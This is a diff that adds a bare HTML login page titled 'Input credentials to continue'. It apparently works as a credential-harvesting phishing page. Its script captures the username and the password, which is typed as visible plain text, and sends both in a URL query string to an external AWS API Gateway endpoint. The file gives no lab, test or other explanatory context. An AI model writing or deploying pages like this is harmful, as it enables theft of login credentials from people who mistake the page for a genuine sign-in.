@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+<h1>Input credentials to continue</h1>
+<form id="login">
+  <label for="username">Username:</label>
+  <input type="text" id="username" name="username"><br><br>
+  <label for="password">Password:</label>
+  <input type="text" id="password" name="password"><br><br>
+  <input type="submit" value="Submit">
+</form>
+</body>
+<script>
+const form = document.getElementById("login");  
+const baseurl = "https://dfiv0rwmt3.execute-api.us-east-1.amazonaws.com/Default/verification/site"
+ 
+form.addEventListener("submit", (e) => {  
+  e.preventDefault();  
+ 
+  const formData = new FormData(form);  
+  const queryParams = new URLSearchParams(formData);  
+ 
+  // Convert to query string  
+  const queryString = queryParams.toString();  
+  console.log(queryString);   
+ 
+  // Use the query string in a URL  
+  const url = `${baseurl}?${queryString}`;  
+  window.open(url, "_self")
+});  
+</script>
+</html>
